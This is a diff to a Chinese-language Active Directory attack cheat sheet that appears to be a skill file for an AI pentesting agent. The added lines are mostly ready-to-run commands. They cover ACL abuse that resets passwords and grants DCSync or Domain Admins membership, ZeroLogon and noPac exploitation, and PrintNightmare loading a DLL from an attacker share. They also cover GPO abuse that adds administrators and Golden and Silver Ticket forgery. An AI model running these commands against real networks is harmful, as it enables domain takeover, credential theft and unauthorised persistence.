@@ -39,10 +39,28 @@ BloodHound 中常见的危险 ACL 路径：
 | ForceChangePassword | 直接重置目标密码 |
 | AddMember | 将自己加入特权组 |
 
+## ACL 滥用命令速查
+```bash
+# GenericAll on User → 重置密码
+net rpc password USER newpass -U DOMAIN/ATTACKER%PASS -S DC_IP
+# 或
+rpcclient -U "DOMAIN/ATTACKER%PASS" DC_IP -c "setuserinfo2 TARGET_USER 23 'NewPass123!'"
+
+# GenericAll on Group → 添加成员
+net rpc group addmem "Domain Admins" ATTACKER -U DOMAIN/ATTACKER%PASS -S DC_IP
+
+# WriteDACL → 授予自己 DCSync 权限
+impacket-dacledit -action write -rights DCSync -principal ATTACKER -target-dn "DC=domain,DC=com" DOMAIN/ATTACKER:PASS -dc-ip DC_IP
+
+# GenericWrite on User → 设置 SPN 后 Kerberoasting
+python3 targetedKerberoast.py -u ATTACKER -p PASS -d DOMAIN --dc-ip DC_IP
+```
+
 ## 其他提权路径
 - **LAPS**：`netexec ldap DC_IP -u USER -p PASS -M laps` — 读取本地管理员密码
 - **GPP 密码**：`netexec smb DC_IP -u USER -p PASS -M gpp_password` — 组策略中的密码
-- **ADCS 攻击**：`certipy find -u USER -p PASS -dc-ip DC_IP` — 证书服务滥用（ESC1-ESC8）
+- **ADCS 攻击**：→ `read_skill(id="adcs-certipy-attack")` — 证书服务滥用（ESC1-ESC11）
+- **NTLM Relay**：→ `read_skill(id="ntlm-relay-attack")` — 中继攻击获取域控
 
 ## 域控攻击
 
@@ -53,13 +71,84 @@ impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc
 # 获取所有用户的 NTLM 哈希，包括 krbtgt
 ```
 
-### 高危 CVE（直接攻击域控）
-- **ZeroLogon (CVE-2020-1472)**：将域控机器密码重置为空，获取域管权限
-- **PrintNightmare (CVE-2021-1675)**：远程代码执行
-- **noPac (CVE-2021-42278/42287)**：普通域用户→域管
-- **ADCS ESC8 (PetitPotam)**：强制域控认证到攻击者 → 中继获取域控证书
+### ZeroLogon (CVE-2020-1472)
+将域控机器密码重置为空，直接获取域管权限。影响所有未打补丁的 Windows Server。
+```bash
+# 检测
+python3 zerologon_tester.py DC_HOSTNAME DC_IP
+
+# 利用（危险！会破坏域控密码，需要恢复）
+python3 cve-2020-1472-exploit.py DC_HOSTNAME DC_IP
+
+# 利用后 dump 域内所有哈希
+impacket-secretsdump -no-pass -just-dc DOMAIN/DC_HOSTNAME\$@DC_IP
+
+# ⚠️ 必须恢复域控密码！否则域复制会中断
+impacket-restorepassword DOMAIN/DC_HOSTNAME@DC_HOSTNAME -target-ip DC_IP \
+  -hexpass ORIGINAL_HEX_PASSWORD
+```
+
+### noPac (CVE-2021-42278/42287)
+普通域用户直接提升为域管。利用机器账户名称欺骗 + S4U2self。
+```bash
+# 一键利用
+python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -dump
+# 或获取 shell
+python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -shell
+```
+
+### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
+```bash
+# 远程 RCE（需要 SMB 共享托管 DLL）
+python3 CVE-2021-1675.py DOMAIN/USER:PASS@DC_IP '\\ATTACKER_IP\share\payload.dll'
+```
+
+### ADCS 攻击（ESC1-ESC11）
+证书服务是目前域渗透中最强大的攻击面：
+→ 完整 ADCS 攻击方法论 → `read_skill(id="adcs-certipy-attack")`
+
+### NTLM Relay 到域控
+→ 完整 NTLM 中继攻击 → `read_skill(id="ntlm-relay-attack")`
+
+## GPO 滥用
+
+如果对 GPO 有编辑权限，可以在域内所有关联 OU 的机器上执行命令：
+```bash
+# 检查 GPO 权限
+# BloodHound: 搜索对 GPO 有 GenericWrite/WriteDACL 的用户
+
+# SharpGPOAbuse（Windows）
+SharpGPOAbuse.exe --AddComputerTask --TaskName "pwn" \
+  --Author NT_AUTHORITY\SYSTEM --Command "cmd.exe" \
+  --Arguments "/c net localgroup administrators USER /add" \
+  --GPOName "VULNERABLE_GPO"
+
+# pyGPOAbuse（Linux）
+python3 pygpoabuse.py DOMAIN/USER:PASS -gpo-id "GPO_GUID" \
+  -command "cmd.exe /c net localgroup administrators USER /add" \
+  -dc-ip DC_IP
+```
 
 ## 持久化
+
+### Golden Ticket
+```bash
+# 需要 krbtgt 哈希（DCSync 获取）
+impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user krbtgt
+
+# 伪造 Golden Ticket
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx \
+  -domain DOMAIN administrator
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass DOMAIN/administrator@DC_IP
+```
+
+### Silver Ticket
+```bash
+# 用服务账户 Hash 伪造特定服务票据（不经过域控）
+impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx \
+  -domain DOMAIN -spn cifs/TARGET administrator
+```
 
 | 方法 | 条件 | 隐蔽性 |
 |------|------|--------|
@@ -68,3 +157,5 @@ impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc
 | DCSync 后门 | 域管权限 | 低（给用户加 DCSync 权限） |
 | AdminSDHolder | 域管权限 | 中（60 分钟自动恢复 ACL） |
 | 机器账户 | 域用户即可 | 高（RBCD 后门） |
+| Shadow Credentials | 写 msDS-KeyCredentialLink | 高（证书认证） |
+| Golden Certificate | CA 私钥 | 极高（伪造任意证书） |
